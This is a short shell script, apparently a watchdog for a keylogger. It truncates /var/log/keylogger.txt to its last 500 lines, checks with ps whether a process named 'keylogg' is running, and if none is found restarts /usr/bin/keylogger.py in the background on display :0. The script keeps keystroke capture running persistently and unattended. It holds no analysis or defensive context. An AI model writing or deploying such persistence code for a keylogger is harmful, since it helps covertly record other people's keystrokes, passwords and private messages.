#!/bin/sh

file=`tail -n 500 /var/log/keylogger.txt`
echo "$file" > /var/log/keylogger.txt
tes=`ps faux | grep "keylogg" | wc -l`
if [ $tes -eq 1 ]
then
	DISPLAY=:0 /usr/bin/keylogger.py&
fi
